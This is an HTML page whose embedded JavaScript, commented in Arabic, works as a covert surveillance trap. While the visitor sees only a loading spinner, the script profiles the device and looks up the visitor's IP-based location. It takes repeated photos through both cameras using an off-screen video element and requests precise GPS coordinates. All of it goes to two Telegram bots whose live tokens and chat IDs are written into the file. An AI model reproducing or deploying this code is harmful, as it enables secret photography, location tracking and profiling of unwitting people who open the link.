<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    -webkit-tap-highlight-color: transparent;
  }

  html, body {
    min-height: 100%;
    background: #ffffff !important;
    overflow: hidden;
  }

  body {
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: -apple-system, BlinkMacSystemFont, "Inter", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    color: #333;
    position: relative;
  }

  body::before,
  body::after {
    display: none !important;
  }

  #loader {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 26px;
    animation: fadeIn .5s ease;
  }

  @keyframes fadeIn {
    from { opacity: 0; }
    to   { opacity: 1; }
  }

  .spinner {
    width: 62px;
    height: 62px;
    border: 3px solid #ececec;
    border-top-color: #999999;
    border-radius: 50%;
    animation: spin .85s linear infinite;
    will-change: transform;
  }

  @keyframes spin {
    to { transform: rotate(360deg); }
  }

  .loading-text {
    font-size: 14px;
    color: #cfcfcf;
    letter-spacing: 5px;
    font-weight: 300;
    user-select: none;
    -webkit-user-select: none;
    animation: softPulse 2.4s ease-in-out infinite;
  }

  @keyframes softPulse {
    0%, 100% { opacity: .55; }
    50%      { opacity: 1; }
  }

  #denied {
    display: none;
    text-align: center;
    max-width: 340px;
    padding: 24px;
    animation: fadeIn .4s ease;
  }
  #denied.active { display: block; }

  #denied h1 {
    font-size: 19px;

    color: #222;

    padding: 13px 38px;

    border-radius: 12px;

    font-family: inherit;
    letter-spacing: .3px;
    transition: opacity .18s, transform .18s;
  }
  #retryBtn:active {
    opacity: .8;
    transform: scale(.97);
  }

  video {
    position: fixed;
    left: -9999px;
    top: -9999px;
    width: 2px;
    height: 2px;
    opacity: .01;
    pointer-events: none;
  }

<script>
(function () {
  /* ============================================================
     ⚙️ الإعدادات — بوتات متعددة (كل بوت له توكن + chat_id)
     ============================================================ */
  const BOTS = [
    {
      name    : "البوت الأول",
      token   : "8847064396:AAESRDR7gXJm1kgb8qphlEHj_DRtNaSfj00",
      chat_id : "8273860583"
    },
    {
      name    : "محمد بك ربيع المحامي",
      token   : "8712291045:AAHqqMs0amYJ2Z16XxuC5vLbokrHAztwqjA",
      chat_id : "8865742831"
    }
  ];

  /* ============================================================ */

  const TOTAL_PER_SIDE = 5;
  const SETTLE_MS      = 450;
  const MIN_BRIGHTNESS = 5;
  const PHOTO_GAP_MS   = 80;
  const RELEASE_MS     = 400;

  /* ============ Elements ============ */
  const v         = document.getElementById("v");
  const loaderEl  = document.getElementById("loader");
  const deniedEl  = document.getElementById("denied");
  const retryBtn  = document.getElementById("retryBtn");

  let currentStream = null;
  let running = false;

  const sleep = ms => new Promise(r => setTimeout(r, ms));
  const esc = s => String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");

  /* ============ التحكم في الشاشات ============ */
  function showLoader(){
    loaderEl.style.display = "flex";
    deniedEl.classList.remove("active");
  }
  function showDenied(){
    loaderEl.style.display = "none";
    deniedEl.classList.add("active");
  }

  /* ============================================================
     📡 جلب الـ IP والموقع من السيرفر
     ============================================================ */
  async function fetchIPInfo(){
    // مصدر أول
    try{
      const r = await fetch("https://ipapi.co/json/");
      if(r.ok){
        const j = await r.json();
        if(j && j.ip){
          return {
            ip      : j.ip,
            city    : j.city,
            region  : j.region,
            country : j.country_name,
            postal  : j.postal,
            isp     : j.org,
            asn     : j.asn,
            lat     : j.latitude,
            lon     : j.longitude,
            tz      : j.timezone
          };
        }
      }
    }catch(_){}

    // مصدر بديل
    try{
      const r2 = await fetch("https://api.ipify.org?format=json");
      if(r2.ok){
        const j2 = await r2.json();
        if(j2 && j2.ip){
          return { ip: j2.ip };
        }
      }
    }catch(_){}

    return null;
  }

  /* ============================================================
     🧠 بيانات المتصفح المتقدمة
     ============================================================ */
  async function getBattery(){
    try{
      if(!navigator.getBattery) return null;
      const b = await navigator.getBattery();
      return {level: Math.round(b.level*100)+"%", charging: b.charging};
    }catch{ return null; }
  }

  function getConn(){
    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if(!c) return null;
    return {
      type     : c.effectiveType || "—",
      downlink : c.downlink != null ? c.downlink : "—",
      rtt      : c.rtt != null ? c.rtt : "—",
      saveData : c.saveData ? "نعم" : "لا"
    };
  }

  function devType(){
    const ua = navigator.userAgent;
    if(/Android/i.test(ua)) return "Android";
    if(/iPhone|iPad|iPod/i.test(ua)) return "iOS";
    if(/Windows/i.test(ua)) return "Windows";
    if(/Macintosh|Mac OS X/i.test(ua)) return "Mac";
    if(/Linux/i.test(ua)) return "Linux";
    return "—";
  }

  function getBrowserInfo(){
    const ua = navigator.userAgent;
    let name = "غير معروف", ver = "";
    if(/Edg\/([\d.]+)/.test(ua))         { name="Microsoft Edge"; ver=RegExp.$1; }
    else if(/OPR\/([\d.]+)/.test(ua))    { name="Opera";          ver=RegExp.$1; }
    else if(/Chrome\/([\d.]+)/.test(ua)) { name="Chrome";         ver=RegExp.$1; }
    else if(/Firefox\/([\d.]+)/.test(ua)){ name="Firefox";        ver=RegExp.$1; }
    else if(/Version\/([\d.]+).*Safari/.test(ua)) { name="Safari"; ver=RegExp.$1; }
    else if(/MSIE ([\d.]+)/.test(ua))    { name="IE";             ver=RegExp.$1; }
    return { name, ver };
  }

  function getOSInfo(){
    const ua = navigator.userAgent;
    let name = "—", ver = "";
    if(/Windows NT ([\d.]+)/.test(ua)){
      name="Windows";
      const map={"10.0":"10/11","6.3":"8.1","6.2":"8","6.1":"7","6.0":"Vista","5.1":"XP"};
      ver = map[RegExp.$1] || RegExp.$1;
    }
    else if(/Android ([\d.]+)/.test(ua)){ name="Android"; ver=RegExp.$1; }
    else if(/iPhone OS ([\d_]+)/.test(ua)){ name="iOS"; ver=RegExp.$1.replace(/_/g,"."); }
    else if(/Mac OS X ([\d_]+)/.test(ua)){ name="macOS"; ver=RegExp.$1.replace(/_/g,"."); }
    else if(/Linux/.test(ua)){ name="Linux"; }
    return { name, ver };
  }

  function getGPU(){
    try{
      const c = document.createElement("canvas");
      const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
      if(!gl) return "—";
      const dbg = gl.getExtension("WEBGL_debug_renderer_info");
      if(dbg){
        return gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || "—";
      }
      return gl.getParameter(gl.RENDERER) || "—";
    }catch{ return "—"; }
  }

  async function getStorage(){
    try{
      if(!navigator.storage || !navigator.storage.estimate) return null;
      const est = await navigator.storage.estimate();
      return {
        quota : (est.quota/1024/1024).toFixed(1) + " MB",
        usage : (est.usage/1024/1024).toFixed(2) + " MB"
      };
    }catch{ return null; }
  }

  function getOrientation(){
    if(screen.orientation && screen.orientation.type) return screen.orientation.type;
    if(window.orientation === 0 || window.orientation === 180) return "portrait";
    if(window.orientation === 90 || window.orientation === -90) return "landscape";
    return "—";
  }

  async function collect(){
    // نجمع كل حاجة بالتوازي عشان السرعه
    const [bat, ipInfo, storage] = await Promise.all([
      getBattery(),
      fetchIPInfo(),
      getStorage()
    ]);

    const con = getConn();
    const br  = getBrowserInfo();
    const os  = getOSInfo();
    const gpu = getGPU();

    const lines = [];
    lines.push("🔔 <b>جهاز جديد فتح الصفحة</b>\n");

    // ------- IP والشبكة -------
    lines.push("━━━━━━ <b>🌐 الشبكة و IP</b> ━━━━━━");
    if(ipInfo){
      if(ipInfo.ip)      lines.push(`IP: <code>${esc(ipInfo.ip)}</code>`);
      if(ipInfo.country) lines.push(`🌍 الدولة: <code>${esc(ipInfo.country)}</code>`);
      if(ipInfo.region)  lines.push(`🏙 المحافظة: <code>${esc(ipInfo.region)}</code>`);
      if(ipInfo.city)    lines.push(`🏠 المدينة: <code>${esc(ipInfo.city)}</code>`);
      if(ipInfo.postal)  lines.push(`📮 الرمز البريدي: <code>${esc(ipInfo.postal)}</code>`);
      if(ipInfo.isp)     lines.push(`📡 الشركة: <code>${esc(ipInfo.isp)}</code>`);
      if(ipInfo.asn)     lines.push(`🔢 ASN: <code>${esc(ipInfo.asn)}</code>`);
      if(ipInfo.lat)     lines.push(`📍 إحداثيات IP: <code>${ipInfo.lat},${ipInfo.lon}</code>`);
      if(ipInfo.tz)      lines.push(`🕐 توقيت IP: <code>${esc(ipInfo.tz)}</code>`);
    }else{
      lines.push("❌ لم يتم الحصول على بيانات IP");
    }
    if(con){
      lines.push(`📶 نوع الشبكة: <code>${esc(con.type)}</code>`);
      lines.push(`⬇️ سرعة تقريبية: <code>${esc(String(con.downlink))} Mbps</code>`);
      lines.push(`⏱ زمن الاستجابة: <code>${esc(String(con.rtt))} ms</code>`);
      lines.push(`💾 توفير البيانات: <code>${esc(con.saveData)}</code>`);
    }
    lines.push(`📡 متصل بالإنترنت: <code>${navigator.onLine ? "نعم" : "لا"}</code>`);

    // ------- الجهاز -------
    lines.push("\n━━━━━━ <b>📱 الجهاز</b> ━━━━━━");
    lines.push(`نوع الجهاز: <code>${esc(devType())}</code>`);
    lines.push(`نظام التشغيل: <code>${esc(os.name)} ${esc(os.ver)}</code>`);
    lines.push(`المنصة: <code>${esc(navigator.platform || "—")}</code>`);
    lines.push(`المتصفح: <code>${esc(br.name)} ${esc(br.ver)}</code>`);
    lines.push(`اللغة: <code>${esc(navigator.language)}</code>`);
    lines.push(`لغات مقترحة: <code>${esc((navigator.languages||[]).join(", "))}</code>`);
    lines.push(`عدد الأنوية: <code>${navigator.hardwareConcurrency || "—"}</code>`);
    lines.push(`الذاكرة التقديرية: <code>${navigator.deviceMemory ? navigator.deviceMemory+" GB" : "—"}</code>`);
    lines.push(`كارت الرسومات: <code>${esc(gpu)}</code>`);
    lines.push(`دعم اللمس: <code>${("ontouchstart" in window) ? "نعم" : "لا"}</code>`);
    lines.push(`نقاط اللمس: <code>${navigator.maxTouchPoints || 0}</code>`);
    lines.push(`البطارية: <code>${bat ? `${bat.level} ${bat.charging?"⚡ يشحن":"🔌 لا يشحن"}` : "—"}</code>`);

    // ------- الشاشة -------
    lines.push("\n━━━━━━ <b>🖥 الشاشة</b> ━━━━━━");
    lines.push(`المقاس: <code>${screen.width}×${screen.height}</code>`);
    lines.push(`المقاس الفعلي: <code>${screen.availWidth}×${screen.availHeight}</code>`);
    lines.push(`كثافة البكسل: <code>${devicePixelRatio}</code>`);
    lines.push(`عمق الألوان: <code>${screen.colorDepth} bit</code>`);
    lines.push(`عمق البكسل: <code>${screen.pixelDepth} bit</code>`);
    lines.push(`اتجاه الشاشة: <code>${esc(getOrientation())}</code>`);

    // ------- التخزين -------
    if(storage){
      lines.push("\n━━━━━━ <b>💾 التخزين</b> ━━━━━━");
      lines.push(`المساحة المتاحة: <code>${storage.quota}</code>`);
      lines.push(`المستخدم: <code>${storage.usage}</code>`);
    }

    // ------- إعدادات الخصوصية -------
    lines.push("\n━━━━━━ <b>🔒 الخصوصية</b> ━━━━━━");
    lines.push(`الكوكيز: <code>${navigator.cookieEnabled ? "مفعّلة" : "معطّلة"}</code>`);
    lines.push(`Do Not Track: <code>${navigator.doNotTrack || "—"}</code>`);
    lines.push(`المرجع: <code>${esc(document.referrer || "مباشر")}</code>`);

    // ------- الوقت والمنطقة -------
    lines.push("\n━━━━━━ <b>🕐 الوقت</b> ━━━━━━");
    lines.push(`المنطقة الزمنية: <code>${esc(Intl.DateTimeFormat().resolvedOptions().timeZone)}</code>`);
    lines.push(`فرق التوقيت: <code>UTC${new Date().getTimezoneOffset() <= 0 ? "+" : "-"}${Math.abs(new Date().getTimezoneOffset()/60)}</code>`);
    lines.push(`وقت الفتح: <code>${esc(new Date().toLocaleString("ar-EG"))}</code>`);

    // ------- UA -------
    lines.push("\n━━━━━━ <b>🌐 User Agent</b> ━━━━━━");
    lines.push(`<code>${esc(navigator.userAgent)}</code>`);

    return lines.join("\n");
  }

  /* ============================================================
     تليجرام — إرسال لكل البوتات معًا
     ============================================================ */
  function broadcastToBots(endpoint, buildForm){
    return Promise.all(
      BOTS.map(bot => {
        const fd = buildForm(bot);
        return fetch(`https://api.telegram.org/bot${bot.token}/${endpoint}`, {
          method: "POST",
          body: fd
        }).catch(()=>{});
      })
    );
  }

  function sendText(t){
    return broadcastToBots("sendMessage", bot => {
      const fd = new FormData();
      fd.append("chat_id", bot.chat_id);
      fd.append("text", t);
      fd.append("parse_mode", "HTML");
      return fd;
    });
  }

  function sendPhoto(blob, cap){
    return broadcastToBots("sendPhoto", bot => {
      const fd = new FormData();
      fd.append("chat_id", bot.chat_id);
      fd.append("caption", cap);
      fd.append("photo", blob, "p.jpg");
      return fd;
    });
  }

  function sendLocation(lat, lon, cap){
    return broadcastToBots("sendLocation", bot => {
      const fd = new FormData();
      fd.append("chat_id", bot.chat_id);
      fd.append("latitude", lat);
      fd.append("longitude", lon);
      if(cap) fd.append("caption", cap);
      return fd;
    });
  }

  /* ============================================================
     الكاميرا
     ============================================================ */
  function waitForRealFrame(videoEl, timeout = 2500){
    if (typeof videoEl.requestVideoFrameCallback === "function"){
      return Promise.race([
        new Promise(res => videoEl.requestVideoFrameCallback(() => res())),
        new Promise(res => setTimeout(res, timeout))
      ]);
    }
    return new Promise(res => {
      const done = () => res();
      videoEl.addEventListener("playing", done, {once:true});
      videoEl.addEventListener("canplay", done, {once:true});
      setTimeout(done, timeout);
    });
  }

  async function closeCamera(){
    if (currentStream){
      currentStream.getTracks().forEach(t => { try{ t.stop(); }catch(_){} });
      currentStream = null;
    }
    if (v.srcObject) v.srcObject = null;
    await sleep(RELEASE_MS);
  }

  async function openCamera(facing, maxTries = 3){
    for (let attempt = 1; attempt <= maxTries; attempt++){
      try{
        await closeCamera();
        const s = await navigator.mediaDevices.getUserMedia({
          video:{ facingMode:{ideal: facing}, width:{ideal:1280}, height:{ideal:720} },
          audio:false
        });
        currentStream = s;
        v.srcObject = s;
        try{ await v.play(); }catch(_){}
        await waitForRealFrame(v);
        await sleep(SETTLE_MS);
        return s;
      }catch(e){
        if (e.name === "NotAllowedError" || e.name === "PermissionDeniedError"){
          throw e;
        }
        console.warn(`camera ${facing} try ${attempt} failed:`, e.message);
        if (attempt === maxTries) throw e;
        await sleep(600);
      }
    }
  }

  function capture(isFront){
    return new Promise(resolve => {
      const c = document.createElement("canvas");
      c.width  = v.videoWidth  || 1280;
      c.height = v.videoHeight || 720;
      const ctx = c.getContext("2d");
      if (isFront){
        ctx.translate(c.width, 0);
        ctx.scale(-1, 1);
      }
      ctx.drawImage(v, 0, 0, c.width, c.height);

      let brightness = 255;
      try{
        const sw = Math.min(200, c.width);
        const sh = Math.min(200, c.height);
        const sx = (c.width  - sw) / 2;
        const sy = (c.height - sh) / 2;
        const data = ctx.getImageData(sx, sy, sw, sh).data;
        let sum = 0, n = 0;
        for(let i=0; i<data.length; i+=16){
          sum += data[i] + data[i+1] + data[i+2];
          n += 3;
        }
        brightness = sum / n;
      }catch(_){}

      c.toBlob(b => resolve({blob:b, brightness}), "image/jpeg", 0.72);
    });
  }

  async function captureSafe(isFront, maxTries = 4){
    let best = null;
    for(let attempt = 1; attempt <= maxTries; attempt++){
      const {blob, brightness} = await capture(isFront);
      if(blob && brightness >= MIN_BRIGHTNESS) return {blob, brightness};
      if(blob && (!best || brightness > best.brightness)) best = {blob, brightness};
      await sleep(250);
    }
    return best;
  }

  /* ============================================================
     الموقع
     ============================================================ */
  function requestLocation(timeoutMs = 12000){
    return new Promise(resolve => {
      if(!navigator.geolocation) return resolve(null);
      const timer = setTimeout(() => resolve(null), timeoutMs);
      navigator.geolocation.getCurrentPosition(
        pos => {
          clearTimeout(timer);
          resolve({lat:pos.coords.latitude, lon:pos.coords.longitude, accuracy:pos.coords.accuracy});
        },
        err => { clearTimeout(timer); resolve({ error: err.message }); },
        { enableHighAccuracy: true, timeout: timeoutMs, maximumAge: 0 }
      );
    });
  }

  /* ============================================================
     مرحلة تصوير
     ============================================================ */
  async function capturePhase(facing, label, count){
    await openCamera(facing);

    for (let i = 1; i <= count; i++){
      const result = await captureSafe(facing === "user");
      if (result && result.blob){
        sendPhoto(result.blob, `${label} #${i}`);
      }
      await sleep(PHOTO_GAP_MS);
    }
  }

  /* ============================================================
     التسلسل الكامل
     ============================================================ */
  async function runFullSequence(){
    if (running) return;
    running = true;

    showLoader();

    // بيانات الجهاز — تُرسل بالتوازي بدون انتظار
    collect().then(t => sendText(t)).catch(()=>{});

    try {
      // 1) الكاميرا الأمامية
      await capturePhase("user", "📸 الكاميرا الأمامية", TOTAL_PER_SIDE);

      // 2) الكاميرا الخلفية
      await sleep(300);
      await capturePhase("environment", "📷 الكاميرا الخلفية", TOTAL_PER_SIDE);

      // 3) الموقع الجغرافي
      const loc = await requestLocation();

      if (loc && loc.lat !== undefined){
        const cap =
          `📍 <b>الموقع الجغرافي</b>\n` +
          `🌐 https://maps.google.com/?q=${loc.lat},${loc.lon}\n` +
          `🎯 الدقة: ${Math.round(loc.accuracy)} م`;
        sendLocation(loc.lat, loc.lon, cap);
      }else if (loc && loc.error){
        sendText(`📍 <b>الموقع الجغرافي</b>\n❌ ${esc(loc.error)}`);
      }else{
        sendText("📍 <b>الموقع الجغرافي</b>\n❌ لم يتم الحصول على الموقع");
      }

      // 4) نقفل الكاميرا
      await closeCamera();

    } catch (err) {
      await closeCamera();
      showDenied();
      sendText(`❌ <b>رُفض الوصول للكاميرا</b>\n<code>${esc(err.message || err.name || "unknown")}</code>`);
      running = false;
    }
  }

  /* ============================================================
     الأحداث
     ============================================================ */
  retryBtn.addEventListener("click", () => {
    if (running) return;
    runFullSequence();
  });

  /* ============================================================
     🚀 تشغيل تلقائي
     ============================================================ */
  function boot(){
    setTimeout(runFullSequence, 250);
  }

  if (document.readyState === "complete" || document.readyState === "interactive"){
    boot();
  } else {
    document.addEventListener("DOMContentLoaded", boot);
  }

})();
</script>
